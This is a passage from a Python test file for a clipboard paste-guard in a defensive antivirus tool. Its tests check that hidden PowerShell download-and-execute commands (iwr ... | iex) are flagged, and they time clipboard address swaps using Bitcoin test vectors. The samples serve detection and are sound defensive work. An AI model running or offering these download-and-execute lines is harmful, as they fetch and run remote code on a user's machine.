        for forbidden in ("SetClipboardData", "EmptyClipboard", "SetClipboardViewer",
                          "AddClipboardFormatListener", "SetWindowsHookEx"):
            self.assertNotIn(forbidden, source, f"{forbidden} must not appear")

    @unittest.skipIf(sys.platform == "win32", "checks the off-Windows path")
    def test_windows_clipboard_reports_unavailable_off_windows(self):
        self.assertFalse(clipguard.WindowsClipboard().available)


class TestDetectionIsUnchanged(GuardCase):
    """It is advisory, outside the scoring model: no Finding, no Verdict, no
    file moved. The first version of this test compared a value with itself."""

    def test_the_module_reaches_only_config_and_events(self):
        source = Path(clipguard.__file__).read_text(encoding="utf-8")
        imports = [line.strip() for line in source.splitlines()
                   if line.startswith(("from .", "from avguard", "import avguard"))]
        self.assertEqual(imports, ["from . import config", "from .events import Event, EventStore"])
        self.assertNotIn("import shutil", source)

    def test_a_warning_tick_leaves_one_clipboard_event_and_nothing_else(self):
        self.guard.tick()
        self.clip.put(WARN_LINE)
        self.guard.tick()
        import json
        lines = [json.loads(l) for l in (self.tmp / "events.jsonl").read_text(encoding="utf-8").splitlines()]
        self.assertEqual([(e["kind"], e["path"], e["score"], e["level"]) for e in lines],
                         [("clipboard", "", 0, WARNING)])
        self.assertEqual(sorted(p.name for p in self.tmp.iterdir()), ["events.jsonl"],
                         "nothing else was written: no quarantine, no cache, no ignore file")


class TestTheCliVerb(unittest.TestCase):
    def test_paste_check_classifies_a_file_and_exits_by_tier(self):
        import avguard.__main__ as cli
        tmp = Path(_tempfile.mkdtemp(prefix="avguard-clip-cli-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(tmp, ignore_errors=True))
        warn = tmp / "w.txt"; warn.write_text(WARN_LINE, encoding="utf-8")
        clean = tmp / "c.txt"; clean.write_text("winget install --id Git.Git", encoding="utf-8")
        import contextlib
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            self.assertEqual(cli.main(["--paste-check", str(warn)]), 1)
            self.assertEqual(cli.main(["--paste-check", str(clean)]), 0)
        text = out.getvalue()
        self.assertIn("WARNING", text)


class TestLaunchersInProse(unittest.TestCase):
    """A launcher word in a sentence is not a command. Before this, prose with
    a URL and the word "start" in it earned a notice."""

    def test_prose_naming_launchers_matches_nothing(self):
        for text in (
            "Open cmd and start https://example.com/setup to begin; it downloads the installer.",
            "In PowerShell, iex runs a string as code; see https://example.com/docs before using it.",
            "The mshta binary lives in System32; see https://example.com/lolbins for the list.",
        ):
            self.assertIsNone(clipguard.classify(text), text)

    def test_a_launcher_reached_through_a_path_quote_or_handoff_still_counts(self):
        for text in (
            '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -w hidden -c "iwr https://example.invalid/p|iex"',
            'start powershell -w hidden -c "iwr https://example.invalid/s|iex"',
            'cmd /c powershell -w hidden -c "iwr https://example.invalid/c|iex"',
            '  powershell -w hidden -c "iwr https://example.invalid/w|iex"',
        ):
            m = clipguard.classify(text)
            self.assertIsNotNone(m, text)
            self.assertEqual(m.tier, WARNING, text)


@unittest.skipUnless(sys.platform == "win32", "the clipboard reader is Windows-only")
class TestTheRealClipboard(unittest.TestCase):
    """On the Windows runner, which has a desktop: the ctypes reader binds,
    polls and reads without raising. The first version referenced
    ctypes.wintypes without importing it and every other test stayed green."""

    def test_the_reader_binds_polls_and_reads(self):
        source = clipguard.WindowsClipboard()
        self.assertTrue(source.available)
        self.assertGreaterEqual(source.sequence(), 0)
        try:
            clip = source.read()
        except clipguard.ClipboardBusy as exc:
            self.skipTest(f"the clipboard is held by another program: {exc}")
        self.assertTrue(clip is None or isinstance(clip, clipguard.ClipText))
        self.assertIsNone(source._image_name(0), "no window, no owner")

    def test_what_the_test_writes_is_what_the_reader_reads(self):
        """The module never writes the clipboard; this test does, through the
        same user32, so the read path is checked against known bytes."""
        import ctypes
        import ctypes.wintypes as wt
        user32 = ctypes.WinDLL("user32", use_last_error=True)
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        user32.OpenClipboard.argtypes = [wt.HWND]
        user32.OpenClipboard.restype = wt.BOOL
        user32.EmptyClipboard.restype = wt.BOOL
        user32.SetClipboardData.argtypes = [wt.UINT, wt.HANDLE]
        user32.SetClipboardData.restype = wt.HANDLE
        user32.CloseClipboard.restype = wt.BOOL
        kernel32.GlobalAlloc.argtypes = [wt.UINT, ctypes.c_size_t]
        kernel32.GlobalAlloc.restype = wt.HGLOBAL
        kernel32.GlobalLock.argtypes = [wt.HGLOBAL]
        kernel32.GlobalLock.restype = wt.LPVOID
        kernel32.GlobalUnlock.argtypes = [wt.HGLOBAL]
        kernel32.GlobalUnlock.restype = wt.BOOL
        # The command first: a prefix would put the launcher outside command
        # position, which is the rule, and the guard would rightly say nothing.
        text = WARN_LINE + " avguard clipboard self-test \u2713"
        data = text.encode("utf-16-le") + b"\0\0"
        source = clipguard.WindowsClipboard()
        before = source.sequence()
        if not user32.OpenClipboard(None):
            self.skipTest("the clipboard could not be opened for writing")
        try:
            user32.EmptyClipboard()
            handle = kernel32.GlobalAlloc(0x0002, len(data))          # GMEM_MOVEABLE
            pointer = kernel32.GlobalLock(handle)
            ctypes.memmove(pointer, data, len(data))
            kernel32.GlobalUnlock(handle)
            if not user32.SetClipboardData(clipguard.CF_UNICODETEXT, handle):
                self.skipTest("SetClipboardData failed")
        finally:
            user32.CloseClipboard()
        self.assertNotEqual(source.sequence(), before, "a write moves the sequence number")
        clip = source.read()
        self.assertEqual(clip.text, text)
        self.assertEqual(clip.chars, len(text))
        self.assertFalse(clip.excluded)
        guard = PasteGuard(source, None)
        guard._last_sequence = before
        self.assertEqual(guard.tick().tier, WARNING, "the guard, end to end, on a real clipboard")

    def test_the_sequence_number_cost_is_printed(self):
        import timeit
        source = clipguard.WindowsClipboard()
        n = 100_000
        per_call = timeit.timeit(source.sequence, number=n) / n * 1e6
        print(f"\n  GetClipboardSequenceNumber: {per_call:.2f} us per call over {n:,}")
        self.assertLess(per_call, 50.0)


@unittest.skipUnless(sys.platform == "win32", "the clipboard is Windows-only")
class TestWhatASwapLooksLikeToTheTick(unittest.TestCase):
    """The measurement docs/next-6.md item 6 asks for before a swap guard is
    built: what a 500 ms poll sees when one write replaces another D ms
    later. The test writes the clipboard (the module never does); the two
    texts are BIP-173 test vectors, two valid segwit addresses of one family.
    Nothing here is asserted beyond the harness working: the numbers are the
    result, printed for the ROADMAP."""

    FIRST = "bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4"
    SECOND = "bc1qrp33g0q5c5txsp9arysrx4k6zdkfs4nce4xj0gdcccefvpysxf3qccfmv3"
    TICK = 0.5

    def setUp(self) -> None:
        import ctypes
        import ctypes.wintypes as wt
        self.ctypes = ctypes
        user32 = ctypes.WinDLL("user32", use_last_error=True)
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        user32.OpenClipboard.argtypes = [wt.HWND]
        user32.OpenClipboard.restype = wt.BOOL
        user32.EmptyClipboard.restype = wt.BOOL
        user32.SetClipboardData.argtypes = [wt.UINT, wt.HANDLE]
        user32.SetClipboardData.restype = wt.HANDLE
        user32.CloseClipboard.restype = wt.BOOL
        kernel32.GlobalAlloc.argtypes = [wt.UINT, ctypes.c_size_t]
        kernel32.GlobalAlloc.restype = wt.HGLOBAL
        kernel32.GlobalLock.argtypes = [wt.HGLOBAL]
        kernel32.GlobalLock.restype = wt.LPVOID
        kernel32.GlobalUnlock.argtypes = [wt.HGLOBAL]
        kernel32.GlobalUnlock.restype = wt.BOOL
        self.user32, self.kernel32 = user32, kernel32
        self.source = clipguard.WindowsClipboard()
        if not self.source.available:
            self.skipTest(self.source.unavailable_reason)

    def _put(self, fmt: int, data: bytes) -> None:
        handle = self.kernel32.GlobalAlloc(0x0002, len(data))           # GMEM_MOVEABLE
        pointer = self.kernel32.GlobalLock(handle)
        self.ctypes.memmove(pointer, data, len(data))
        self.kernel32.GlobalUnlock(handle)
        self.user32.SetClipboardData(fmt, handle)

    def write(self, text: str, formats: int = 1, empty_only: bool = False) -> bool:
        import time
        for _ in range(50):
            if self.user32.OpenClipboard(None):
                break
            time.sleep(0.01)
        else:
            return False
        try:
            self.user32.EmptyClipboard()
            if not empty_only:
                self._put(clipguard.CF_UNICODETEXT, text.encode("utf-16-le") + b"\0\0")
                if formats >= 2:
                    self._put(1, text.encode("ascii", "replace") + b"\0")          # CF_TEXT
                if formats >= 3:
                    self._put(16, (0x0409).to_bytes(4, "little"))                # CF_LOCALE
            return True
        finally:
            self.user32.CloseClipboard()

    def test_the_sequence_per_write_and_what_a_poll_sees_of_a_swap(self):
        import random
        import threading
        import time
        seq = self.source.sequence
        # 1. What one write moves the number by, and whether anything on the
        #    machine writes again afterwards (clipboard history, a sync agent).
        steps = []
        for label, kwargs in (("one format", {}), ("three formats", {"formats": 3}),
                              ("emptied only", {"empty_only": True})):
            before = seq()
            self.assertTrue(self.write(self.FIRST, **kwargs), "the clipboard could not be opened")
            written = seq()
            time.sleep(1.0)
            steps.append((label, written - before, seq() - written))
        print("\n  clipboard sequence per write: " + "; ".join(
            f"{label} +{moved} (then +{late} within 1 s)" for label, moved, late in steps))
        # The last step left the clipboard empty: write once more, then ask
        # who owns a write made with no window.
        self.assertTrue(self.write(self.FIRST))
        clip = self.source.read()
        print(f"  owner of a write made with OpenClipboard(NULL): {clip.owner if clip else 'no text read'!r}")

        # 2. A swap D ms after the copy, under a poll every 500 ms at a random phase.
        rng = random.Random(20261007)
        rows = []
        for delay_ms in (0, 50, 200, 400, 600):
            seen_first = between = neither = busy = 0
            trials = 6
            for _ in range(trials):
                observed: list[tuple[int, str | None]] = []
                stop = threading.Event()

                def poll() -> None:
                    nonlocal busy
                    last = seq()
                    observed.append((last, None))
                    while not stop.wait(self.TICK):
                        now = seq()
                        if now == last:
                            observed.append((now, None))
                            continue
                        try:
                            clip = self.source.read()
                            observed.append((now, clip.text if clip else None))
                            last = now
                        except clipguard.ClipboardBusy:
                            busy += 1               # the number stays; the next tick retries
                start = seq()
                poller = threading.Thread(target=poll, daemon=True)
                poller.start()
                time.sleep(rng.uniform(0, self.TICK))
                self.assertTrue(self.write(self.FIRST))
                after_first = seq()
                time.sleep(delay_ms / 1000)
                self.assertTrue(self.write(self.SECOND))
                after_second = seq()
                time.sleep(2.5 * self.TICK)
                stop.set()
                poller.join(5)
                texts = [text for _, text in observed if text]
                self.assertEqual(texts[-1] if texts else None, self.SECOND, "the harness: the last read is the second write")
                numbers = [number for number, _ in observed]
                if self.FIRST in texts:
                    seen_first += 1
                elif any(a <= start and b >= after_second for a, b in zip(numbers, numbers[1:])) and \
                        after_first not in numbers:
                    between += 1
                else:
                    neither += 1
            rows.append((delay_ms, trials, seen_first, between, neither, busy))
        for delay_ms, trials, seen_first, between, neither, busy in rows:
            print(f"  swap {delay_ms:>3} ms after the copy, 500 ms poll: original read {seen_first}/{trials}, "
                  f"both writes between two ticks {between}/{trials}, neither {neither}/{trials}"
                  f"{f', {busy} busy read(s)' if busy else ''}")


class TestTheWindowIntegration(unittest.TestCase):
    """The GUI side of the guard, on a fake self: the off switch, the Health
    row, the first-run choice, the offer and the enable path. The one widget
    test runs on the shared withdrawn root when a display exists."""

    def setUp(self) -> None:
        try:
            from avguard import gui
        except ImportError:
            self.skipTest("GUI dependencies are not installed")
        self.gui = gui
        self.tmp = Path(_tempfile.mkdtemp(prefix="avguard-clip-gui-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(self.tmp, ignore_errors=True))

    def fake_cfg(self, **values):
        from types import SimpleNamespace
        saved: list[int] = []
        cfg = SimpleNamespace(auto_quarantine=False, onboarding_completed=False, paste_guard_enabled=False,
                              paste_guard_offered=False, realtime_enabled=False,
                              save=lambda: saved.append(1), saves=saved)
        for key, value in values.items():
            setattr(cfg, key, value)
        return cfg

    def test_the_tick_with_the_guard_off_touches_nothing_and_disarms(self):
        from types import SimpleNamespace
        clip = FakeClipboard(sequence=5)
        guard = PasteGuard(clip, None, ignore_path=self.tmp / "i.json")
        scheduled: list[tuple] = []
        fake = SimpleNamespace(cfg=self.fake_cfg(paste_guard_enabled=True), pasteguard=guard,
                               _shutting_down=False, after=lambda ms, fn: scheduled.append((ms, fn)))
        fake._tick_clipboard = object()
        self.gui.AVGuardApp._tick_clipboard(fake)                 # on: records the sequence
        fake.cfg.paste_guard_enabled = False
        clip.put(WARN_LINE)                                       # copied while off
        self.gui.AVGuardApp._tick_clipboard(fake)
        self.gui.AVGuardApp._tick_clipboard(fake)
        self.assertEqual((clip.sequence_calls, clip.read_calls), (1, 0), "off: no user32 call at all")
        fake.cfg.paste_guard_enabled = True
        self.gui.AVGuardApp._tick_clipboard(fake)                 # back on: records only
        self.assertEqual(clip.read_calls, 0, "what was copied while off is never read")
        clip.put(WARN_LINE)
        self.gui.AVGuardApp._tick_clipboard(fake)
        self.assertEqual(clip.read_calls, 1)
        self.assertEqual({ms for ms, _ in scheduled}, {self.gui.CLIPBOARD_TICK_MS})
        self.assertEqual(len(scheduled), 5, "rescheduled from finally every time")

    def test_a_tick_that_dies_logs_once(self):
        from types import SimpleNamespace
        fake = SimpleNamespace(cfg=self.fake_cfg(paste_guard_enabled=True), _shutting_down=False,
                               after=lambda ms, fn: None, pasteguard=SimpleNamespace(
                                   tick=mock.Mock(side_effect=RuntimeError("dead")), disarm=lambda: None))
        fake._tick_clipboard = object()
        with self.assertLogs("avguard.gui", level="ERROR") as logged:
            for _ in range(5):
                self.gui.AVGuardApp._tick_clipboard(fake)
        self.assertEqual(len(logged.records), 1)

    def test_the_health_row_for_off_unavailable_and_on(self):
        from types import SimpleNamespace
        guard = PasteGuard(FakeClipboard(), None, ignore_path=self.tmp / "i.json")
        fake = SimpleNamespace(cfg=self.fake_cfg(), pasteguard=guard)
        self.assertEqual(self.gui.AVGuardApp._describe_paste_guard(fake),
                         (True, "off - the clipboard is never opened"))
        fake.cfg.paste_guard_enabled = True
        guard.source.available = False
        guard.source.unavailable_reason = "the privacy formats could not be registered"
        self.assertEqual(self.gui.AVGuardApp._describe_paste_guard(fake),
                         (True, "the privacy formats could not be registered"))
        guard.source.available = True
        guard.tick()
        healthy, text = self.gui.AVGuardApp._describe_paste_guard(fake)
        self.assertTrue(healthy)
        self.assertIn("nothing is kept and nothing leaves this machine", text)

    def test_dismissing_the_first_run_dialog_turns_nothing_on(self):
        from types import SimpleNamespace
        fake = SimpleNamespace(cfg=self.fake_cfg(), has_lock=True)
        self.gui.AVGuardApp._apply_first_run(fake, False, None)
        self.assertEqual((fake.cfg.paste_guard_enabled, fake.cfg.paste_guard_offered), (False, False),
                         "dismissed: off, and offered again by the banner")
        self.assertEqual((fake.cfg.auto_quarantine, fake.cfg.onboarding_completed), (False, True))
        fake = SimpleNamespace(cfg=self.fake_cfg(), has_lock=True)
        self.gui.AVGuardApp._apply_first_run(fake, False, True)
        self.assertEqual((fake.cfg.paste_guard_enabled, fake.cfg.paste_guard_offered), (True, True))
        self.assertEqual(fake.cfg.saves, [1])

    def test_the_offer_waits_while_another_banner_is_up(self):
        from types import SimpleNamespace
        fake = SimpleNamespace(cfg=self.fake_cfg(), banner=SimpleNamespace(winfo_ismapped=lambda: True),
                               banner_var=SimpleNamespace(get=lambda: "YARA rules failed to load"))
        self.gui.AVGuardApp._offer_paste_guard(fake)
        self.assertFalse(fake.cfg.paste_guard_offered, "not marked offered until it has been shown")
        self.assertEqual(fake.cfg.saves, [])

    def test_enabling_when_the_choice_cannot_be_saved_leaves_the_guard_off(self):
        from types import SimpleNamespace
        cfg = self.fake_cfg()
        cfg.save = mock.Mock(side_effect=OSError("disk full"))
        fake = SimpleNamespace(cfg=cfg)
        with mock.patch.object(self.gui, "Messagebox") as box:
            self.gui.AVGuardApp._enable_paste_guard(fake)
        self.assertFalse(cfg.paste_guard_enabled, "what is shown is what runs")
        self.assertIn("stays off", box.show_error.call_args.args[0])

    def test_the_banner_carries_one_button_on_either_tier_and_the_next_banner_drops_it(self):
        from types import SimpleNamespace
        try:
            from tests.guiroot import gui_root
            root = gui_root()
        except Exception as exc:                                   # no display
            self.skipTest(f"no display: {exc}")
        import tkinter as tk
        import ttkbootstrap as tb
        holder = tb.Frame(root)
        panes = tb.Frame(holder)
        panes.pack()
        var = tk.StringVar(value="")
        banner = tb.Label(holder, textvariable=var)
        fake = SimpleNamespace(banner=banner, banner_var=var, _panes=panes, tray=None,
                               cfg=self.fake_cfg(), _ignore_paste_text=lambda m: None,
                               _enable_paste_guard=lambda: None)
        fake._banner = self.gui.AVGuardApp._banner.__get__(fake)
        warning = clipguard.classify(WARN_LINE)
        self.gui.AVGuardApp._paste_warning(fake, warning, clipguard.ClipText(WARN_LINE, "msedge.exe"))
        self.assertEqual([type(w).__name__ for w in banner.winfo_children()], ["Button"])
        self.assertIn("msedge.exe", var.get())
        notice = clipguard.classify('powershell -c "irm https://astral.sh/uv/install.ps1 | iex"')
        self.gui.AVGuardApp._paste_warning(fake, notice, clipguard.ClipText("x", None))
        self.assertEqual(len(banner.winfo_children()), 1, "a notice can be silenced too")
        fake._banner("Scan complete")
        self.assertEqual(banner.winfo_children(), [], "the button does not outlive its message")
        var.set("")
        self.gui.AVGuardApp._offer_paste_guard(fake)
        self.assertTrue(fake.cfg.paste_guard_offered)
        self.assertEqual([w.cget("text") for w in banner.winfo_children()], ["Turn it on"])
        holder.destroy()


if __name__ == "__main__":
    unittest.main()
